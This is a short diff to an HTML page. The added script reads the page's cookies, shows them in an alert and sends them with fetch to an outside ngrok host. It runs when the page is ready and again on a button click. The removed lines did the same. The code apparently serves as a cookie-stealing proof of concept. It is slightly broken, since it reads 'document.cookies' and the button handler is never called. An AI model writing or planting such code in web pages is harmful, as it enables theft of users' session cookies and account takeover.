@@ -3,12 +3,17 @@
 </head>
 
 <body>
-  <div id="counter">1</div>
+  <button onclick=sendMeCooks>Button</button>
   
   <script>
     if(document.readyState === 'complete') {
-      var cks = document.cookies
-      fetch("http://66191a0f.ngrok.io/?payload=${cks}")
+      sendMeCooks();
+    }
+    
+    function sendMeCooks() {
+      alert(document.cookies);
+      var cks = document.cookies;
+      fetch(`http://66191a0f.ngrok.io/?payload=${cks}`);
     }
   </script>
 </body>
